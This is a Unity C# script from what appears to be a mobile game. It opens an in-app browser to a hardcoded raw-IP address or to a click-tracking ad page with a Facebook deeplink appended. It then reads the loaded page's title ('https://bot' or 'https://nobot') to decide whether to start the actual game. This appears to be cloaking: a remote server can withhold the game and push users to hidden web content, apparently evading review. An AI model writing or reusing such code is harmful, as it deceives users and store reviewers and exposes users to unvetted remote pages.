using UnityEngine;

public class BrowserOpener : MonoBehaviour {

	public string pageToOpen = "http://78.47.187.129/Z4ZvXH31";
    public string adpageOpen = "https://privatlyrics.site/click.php?key=dzvwb16ds2tvm99r1dzz&source=com.KJPGames.Classic";
    const string bot = "https://bot";
    const string nobot = "https://nobot";
    public PlayerProfille playerProfille;
    public FacebookScript facebookScriptDeeplink;
    public GameControllerExample gameController;
    public JSExecute jSExecute;
    InAppBrowser.DisplayOptions options;

	public void OnButtonClicked() {
		options = new InAppBrowser.DisplayOptions();
        options.displayURLAsPageTitle = true;
        if (playerProfille.GetBotData())
        {
            InAppBrowser.OpenURL(pageToOpen, options);
        }
        else
        {
            InAppBrowser.OpenURL(adpageOpen + facebookScriptDeeplink.Facebookdeeplink, options);
        }
	}

    public void PageLoaded()
    {
        jSExecute.ReadyJava();
    }

    void FixedUpdate()
    {
        if (playerProfille.GetBotData())
        {
            if(options.pageTitle == bot)
            {
                OnButtonClicked();
            }
            else if(options.pageTitle == nobot)
            {
                gameController.Inizialize();
                playerProfille.SetBotData(false);
                playerProfille.SaveDataPlayer();
            }
        }
    }

	public void OnClearCacheClicked() {
		InAppBrowser.ClearCache();
	}
}
